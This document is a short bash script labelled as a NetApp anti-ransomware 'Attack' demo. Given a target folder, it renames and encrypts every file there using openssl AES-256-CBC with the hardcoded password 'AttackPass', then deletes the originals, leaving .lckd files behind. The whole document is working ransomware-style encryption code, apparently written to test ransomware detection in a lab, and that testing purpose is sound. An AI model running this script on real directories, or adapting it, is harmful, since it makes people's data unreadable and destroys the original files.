#!/bin/bash
################################################################################
#
# Title:        ONTAP-82-05.sh - Attack
# Author:       NetApp Inc. (badrian)
# Initial 
# Create Date:  2024-11-04
# Description:  Anti-Ransomware
#               - Encrypt and rename files
# 
################################################################################

if [[ "$#" -ne 1 ]]; then
    echo "Usage: $0 <target path>"
    exit 1
elif ! [[ -d $1 ]]; then
    echo "$1 does not exist"
    exit 1
fi

cd $1;
while :
do
        FILES=`find * -type f \(  ! -iname "*.lckd*"  ! -iname "*.key*" \)`;
        for file in $FILES;
        do
                CWD=`pwd`
                encrypt_filename1=$CWD/$file.processing.lckd
                encrypt_filename2=$CWD/$file.lckd.$RANDOM
                printf 'Encrypting:  %s\n' "$file"
                `mv $CWD/$file $encrypt_filename1 2> /dev/null` && `openssl enc -aes-256-cbc -salt -in $encrypt_filename1 -out $encrypt_filename2 -pass pass:AttackPass 2> /dev/null` && `rm $encrypt_filename1 2> /dev/null`
                if [ -f "$encrypt_filename2" ]; then
                        echo ""
#                        sleep 1
                else
                        echo "Encryption failed."
                fi
        done
        break
done